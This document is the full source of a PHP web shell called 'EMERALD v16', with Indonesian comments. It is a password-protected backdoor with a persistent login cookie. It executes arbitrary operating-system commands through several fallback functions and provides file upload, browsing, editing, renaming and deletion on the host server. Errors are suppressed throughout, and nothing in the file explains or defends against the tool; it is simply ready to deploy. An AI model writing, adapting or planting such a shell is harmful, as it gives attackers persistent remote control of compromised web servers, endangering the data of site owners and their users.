<?php
/**
 * EMERALD CORE v16.0 - PERSISTENT SESSION
 * Fix: Login Berulang (Session Timeout/Loss)
 */
error_reporting(0);
@ini_set('memory_limit', '512M');
@set_time_limit(0);

$password = 'alfa'; 
$auth_val = md5($password . $_SERVER['HTTP_USER_AGENT']);

// --- LOGIKA FIX LOGIN (Session + Cookie) ---
session_start();
if (isset($_POST['p']) && $_POST['p'] === $password) {
    $_SESSION['auth_emerald'] = $auth_val;
    setcookie('emerald_key', $auth_val, time() + (86400 * 7), "/"); // Cookie tahan 7 hari
}

// Cek apakah login valid (via Session ATAU Cookie)
if ($_SESSION['auth_emerald'] !== $auth_val && $_COOKIE['emerald_key'] !== $auth_val) {
    die('<html><body style="background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;font-family:monospace;"><form method="POST"><div style="border:1px solid #0f8;padding:30px;"><h2>EMERALD V16</h2><input type="password" name="p" placeholder="Password" style="background:#000;border:1px solid #0f8;color:#0f8;padding:10px;"><br><button type="submit" style="margin-top:10px;width:100%;padding:10px;background:#008f58;color:#fff;border:none;cursor:pointer;">LOGIN</button></div></form></body></html>');
}

if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('emerald_key', '', time() - 3600, "/");
    header("Location: ?"); exit;
}

// --- FUNGSI TERMINAL (NORMAL) ---
function native_cmd($cmd) {
    $out = ''; $cmd = $cmd . " 2>&1";
    $methods = ['shell_exec', 'exec', 'passthru', 'system'];
    foreach ($methods as $m) {
        if (function_exists($m)) {
            ob_start();
            ($m == 'exec') ? @$m($cmd, $r) : @$m($cmd);
            $out = ($m == 'exec') ? join("\n", $r) : ob_get_clean();
            if ($out) return $out;
        }
    }
    return "FAIL: OS Locked.";
}

// --- NAVIGASI ---
$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace('\\', '/', $dir);
@chdir($dir); $dir = getcwd();
$msg = ''; $cmd_out = '';

// --- HANDLERS ---
if (isset($_POST['c'])) { $cmd_out = native_cmd($_POST['c']); }
if (isset($_FILES['u'])) { 
    if (@move_uploaded_file($_FILES['u']['tmp_name'], $dir.'/'.$_FILES['u']['name'])) $msg = "Upload OK!"; 
}
if (isset($_POST['act'])) {
    $fn = $_POST['fn'];
    if ($_POST['act'] == 'save') @file_put_contents($fn, $_POST['cnt']) ? $msg="Saved!" : $msg="Error!";
    if ($_POST['act'] == 'mkdir') @mkdir($fn);
    if ($_POST['act'] == 'ren') @rename($_POST['old'], $_POST['new']);
}
if (isset($_GET['rm'])) { @unlink($_GET['rm']); @rmdir($_GET['rm']); }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald v16</title>
    <style>
        body { background:#0b0e0d; color:#ccc; font-family:sans-serif; margin:0; display:flex; }
        .side { width:280px; background:#080c0b; border-right:1px solid #1f3a2f; height:100vh; padding:20px; position:fixed; box-sizing:border-box; }
        .main { margin-left:280px; padding:30px; width:100%; box-sizing:border-box; }
        .card { background:#111a16; border:1px solid #1f3a2f; border-radius:8px; padding:15px; margin-bottom:20px; }
        input, textarea { background:#000; border:1px solid #1f3a2f; color:#0f8; padding:8px; width:100%; margin-top:5px; box-sizing:border-box; }
        .btn { background:#008f58; color:#fff; border:none; padding:10px; width:100%; cursor:pointer; margin-top:10px; border-radius:4px; font-weight:bold; }
        table { width:100%; border-collapse:collapse; }
        td { padding:8px; border-bottom:1px solid #16241e; font-size:13px; }
        .link { color:#0f8; text-decoration:none; }
        pre { background:#000; color:#0f8; padding:10px; border:1px solid #0f8; overflow:auto; max-height:300px; }
    </style>
</head>
<body>
    <div class="side">
        <h2 style="color:#0f8;margin-top:0;">EMERALD v16</h2>
        <div class="card">
            <form method="POST" enctype="multipart/form-data">
                UPL: <input type="file" name="u">
                <button type="submit" class="btn">UPLOAD</button>
            </form>
        </div>
        <div class="card">
            <form method="POST"><input type="hidden" name="act" value="mkdir">
                MKDIR: <input type="text" name="fn">
                <button type="submit" class="btn">CREATE</button>
            </form>
        </div>
        <a href="?logout=1" class="btn" style="background:#600;display:block;text-align:center;text-decoration:none;">LOGOUT</a>
    </div>

    <div class="main">
        <?php if($msg) echo "<div style='color:#0f8;margin-bottom:15px;'>[!] $msg</div>"; ?>
        <div class="card"><b>PATH:</b> <?=$dir?></div>
        
        <div class="card">
            <form method="POST">CMD: <input type="text" name="c" placeholder="ls -la"></form>
            <?php if($cmd_out): ?><pre><?=htmlspecialchars($cmd_out)?></pre><?php endif; ?>
        </div>

        <div class="card">
            <table>
                <?php
                echo "<tr><td><a href='?d=".urlencode(dirname($dir))."' class='link'>.. [ Back ]</a></td><td></td></tr>";
                foreach(scandir('.') as $f) {
                    if($f == '.' || $f == '..') continue;
                    echo "<tr><td>" . (is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f") . "</td>";
                    echo "<td align='right'>
                        <a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#0af'>Edit</a> | 
                        <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' style='color:red' onclick='return confirm(\"Del?\")'>Del</a>
                    </td></tr>";
                }
                ?>
            </table>
        </div>

        <?php if(isset($_GET['e'])): ?>
        <div class="card">
            <b>Editor: <?=$_GET['e']?></b>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="hidden" name="fn" value="<?=htmlspecialchars($_GET['e'])?>">
                <textarea name="cnt" rows="15"><?=htmlspecialchars(@file_get_contents($_GET['e']))?></textarea>
                <button type="submit" class="btn">SAVE FILE</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
